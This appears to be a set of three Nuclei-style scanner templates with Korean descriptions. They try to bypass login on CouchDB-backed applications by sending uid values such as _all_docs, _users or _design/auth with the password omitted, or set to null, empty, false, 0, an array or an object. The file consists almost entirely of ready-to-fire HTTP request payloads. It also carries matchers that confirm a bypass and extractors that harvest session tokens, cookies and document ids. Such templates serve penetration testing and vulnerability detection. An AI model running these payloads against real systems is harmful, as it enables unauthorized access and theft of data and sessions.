#기본적
id: couchdb-undefined-comparison-bypass

info:
  name: CouchDB NoSQL Injection - Undefined Comparison Bypass
  author: d4wn
  severity: critical
  description: |
    CouchDB의 _all_docs를 이용한 undefined === undefined 비교 우회 취약점.
    uid에 _all_docs를 전달하고 upw 파라미터를 생략하여 인증을 우회합니다.
    result.upw와 req.body.upw 모두 undefined가 되어 비교 검증을 통과합니다.
  reference:
    - https://docs.couchdb.org/en/stable/api/database/bulk-api.html#get--db-_all_docs
    - https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  tags: couchdb,nosqli,injection,auth-bypass,undefined

http:
  - raw:
      # Primary payload: uid=_all_docs without upw parameter
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      - |
        POST /api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      - |
        POST /signin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      # Test with different field names
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"username":"_all_docs"}

      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"user":"_all_docs"}

      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"id":"_all_docs"}

    matchers-condition: or
    matchers:
      # Primary matcher: CouchDB specific response structure (low false positive)
      - type: regex
        name: couchdb-structure-detected
        part: body
        regex:
          - '"total_rows":\s*\d+'
          - '"rows":\s*\['
          - '"id":\s*"[^"]+".*"key":\s*"[^"]+".*"value":'
        condition: or

      # Secondary matcher: No error message (higher coverage but more false positives)
      - type: dsl
        name: no-error-response
        dsl:
          - "status_code == 200"
          - "len(body) > 20"
          - "!contains(tolower(body), 'error')"
          - "!contains(tolower(body), 'fail')"
          - "!contains(tolower(body), 'invalid')"
          - "!contains(tolower(body), 'unauthorized')"
          - "!contains(tolower(body), 'incorrect')"
          - "!contains(tolower(body), 'wrong')"
          - "!contains(tolower(body), 'denied')"
          - "!contains(tolower(body), 'forbidden')"
          - "!contains(tolower(body), 'required')"
          - "!contains(tolower(body), 'missing')"
        condition: and

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"total_rows":\s*(\d+)'
          - '"id":\s*"([^"]+)"'

      - type: kval
        part: header
        kval:
          - set-cookie
          - location

---
#특수문서
id: couchdb-special-documents-injection

info:
  name: CouchDB NoSQL Injection - Special Documents Exploitation
  author: d4wn
  severity: high
  description: |
    CouchDB의 특수 문서(_all_docs, _users, _design 등)를 이용한 인증 우회.
    이러한 특수 문서는 일반 도큐먼트와 다른 구조를 가지며, upw 필드가 존재하지 않아
    undefined 비교를 통해 인증을 우회할 수 있습니다.
  reference:
    - https://docs.couchdb.org/en/stable/api/database/common.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-89
  tags: couchdb,nosqli,injection,special-docs

http:
  - raw:
      # _all_docs exploitation
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      # _users database
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_users"}

      # _design documents
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_design/auth"}

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_design/views"}

      # _local documents
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_local/session"}

      # _security document
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_security"}

      # _changes feed
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_changes"}

      # _replicator
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_replicator"}

    matchers-condition: or
    matchers:
      # Primary: CouchDB-specific structure
      - type: word
        name: couchdb-structure
        part: body
        words:
          - '"total_rows"'
          - '"rows":'
          - '"offset":'
        condition: and

      - type: regex
        name: couchdb-document-structure
        part: body
        regex:
          - '\{"total_rows":\d+,"offset":\d+,"rows":\['
          - '"_id":\s*"[^"]+".*"_rev":\s*"[^"]+"'

      # Secondary: No error + reasonable response
      - type: dsl
        name: successful-response
        dsl:
          - "status_code == 200 || status_code == 302"
          - "len(body) > 30"
          - "!contains(tolower(body), 'error')"
          - "!contains(tolower(body), 'fail')"
          - "!contains(tolower(body), 'invalid')"
          - "!contains(tolower(body), 'unauthorized')"
          - "!contains(tolower(body), 'denied')"
          - "!contains(tolower(body), 'blocked')"
        condition: and

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"total_rows":\s*(\d+)'
          - '"id":\s*"([^"]+)"'
          - '"_id":\s*"([^"]+)"'

---
#Type confusion and WAF
id: couchdb-parameter-pollution

info:
  name: CouchDB NoSQL Injection - Parameter Pollution & Type Confusion
  author: d4wn
  severity: high
  description: |
    다양한 데이터 타입과 파라미터 조작을 통한 CouchDB 인증 우회.
    JSON 객체, 배열, null 값 등을 이용하여 undefined 비교를 우회합니다.
  reference:
    - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-89
  tags: couchdb,nosqli,injection,parameter-pollution

http:
  - raw:
      # Method 1: Missing password parameter (primary attack)
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs"}

      # Method 2: Null password value
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs","upw":null}

      # Method 3: Empty string password
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs","upw":""}

      # Method 4: Array injection
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":["_all_docs"]}

      # Method 5: Object injection with _id
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":{"_id":"_all_docs"}}

      # Method 6: URL-encoded form data
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        uid=_all_docs

      # Method 7: Boolean type confusion
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs","upw":false}

      # Method 8: Numeric type confusion
      - |
        POST /auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"uid":"_all_docs","upw":0}

    matchers-condition: or
    matchers:
      # Primary: CouchDB response patterns (most accurate)
      - type: regex
        name: couchdb-response
        part: body
        regex:
          - '"total_rows":\s*\d+'
          - '"rows":\s*\['
          - '\{"id":"[^"]+","key":"[^"]+","value":\{'
        condition: or

      # Secondary: Success indicators without errors
      - type: dsl
        name: bypass-success
        dsl:
          - "status_code == 200 || status_code == 302"
          - "len(body) > 25"
          - "!contains(tolower(body), 'error')"
          - "!contains(tolower(body), 'fail')"
          - "!contains(tolower(body), 'invalid')"
          - "!contains(tolower(body), 'unauthorized')"
          - "!contains(tolower(body), 'incorrect')"
          - "!contains(tolower(body), 'wrong')"
          - "!contains(tolower(body), 'denied')"
          - "!contains(tolower(body), 'blocked')"
          - "!contains(tolower(body), 'forbidden')"
          - "!contains(tolower(body), 'required')"
          - "!contains(tolower(body), 'missing')"
        condition: and

      # Tertiary: Redirect after successful auth
      - type: status
        name: redirect-success
        status:
          - 302
          - 301

    extractors:
      - type: regex
        part: body
        regex:
          - '"token":\s*"([^"]+)"'
          - '"session":\s*"([^"]+)"'
          - '"sessionId":\s*"([^"]+)"'
          - '"total_rows":\s*(\d+)'

      - type: kval
        part: header
        kval:
          - set-cookie
          - authorization
          - location